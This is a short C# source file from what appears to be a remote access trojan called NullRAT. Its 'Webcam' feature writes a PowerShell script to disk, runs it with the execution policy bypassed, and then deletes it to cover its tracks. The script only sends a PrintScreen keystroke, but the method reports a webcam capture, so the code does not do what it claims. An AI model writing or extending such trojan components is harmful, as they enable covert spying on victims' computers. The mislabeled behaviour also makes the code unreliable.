using System;
using System.IO;

namespace NullRAT.Features
{
    public static class Webcam
    {
        public static string Capture()
        {
            try
            {
                string script = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep 1";
                File.WriteAllText("capture.ps1", script);
                System.Diagnostics.Process.Start("powershell.exe", "-ExecutionPolicy Bypass -File capture.ps1").WaitForExit();
                File.Delete("capture.ps1");
                return "Webcam capture attempted via system tools.";
            }
            catch (Exception ex)
            {
                return $"Webcam error: {ex.Message}";
            }
        }
    }
}